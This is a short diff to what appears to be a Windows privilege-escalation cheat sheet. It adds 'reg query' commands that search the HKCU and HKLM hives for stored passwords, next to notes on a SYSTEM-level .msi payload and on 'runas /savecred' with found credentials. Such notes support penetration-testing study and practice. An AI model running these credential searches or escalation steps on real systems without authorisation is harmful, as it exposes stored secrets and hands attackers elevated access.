@@ -918,7 +918,10 @@ We can craft a .msi payload and install it on the target Windows machine with SY
 **Query for password in registry hive** \
 Check if the password is saved anywhere within the HKLM or HKCU hive: \
 ```reg query HKCU /f password /t REG_SZ /s ``` \
-```reg query HKLM /f password /t REG_SZ /s``` 
+```reg query HKLM /f password /t REG_SZ /s``` \
+or try with just 'pass': \
+```reg query HKCU /f pass /t REG_SZ /s ``` \
+```reg query HKLM /f pass /t REG_SZ /s``` 
 
 **Check for saved credentials** \
 If saved creds is found during enum -> ```runas /savecred /user:$USERNAME "$COMMAND"``` to run the command under the saved cred's privilege level. 
